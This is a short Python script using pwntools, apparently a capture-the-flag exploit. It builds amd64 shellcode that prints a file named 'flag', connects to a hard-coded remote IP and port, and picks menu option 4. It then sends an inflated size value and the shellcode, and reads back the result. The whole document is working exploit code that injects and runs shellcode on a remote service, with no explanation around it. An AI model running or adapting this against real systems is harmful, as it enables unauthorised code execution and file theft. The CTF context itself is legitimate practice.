import pwn
import ctypes

pwn.context.update(os='linux', arch='amd64')
payload = pwn.asm(pwn.shellcraft.cat('flag'))
print(payload)


conn = pwn.connect('3.71.110.92', 40000)

conn.recvuntil(b': ')
conn.sendline(b'4')
conn.recvuntil(b': ')
conn.sendline(str(len(payload) * 100).encode()) 
conn.recv()
conn.sendline(payload)
conn.recvall()

conn.close()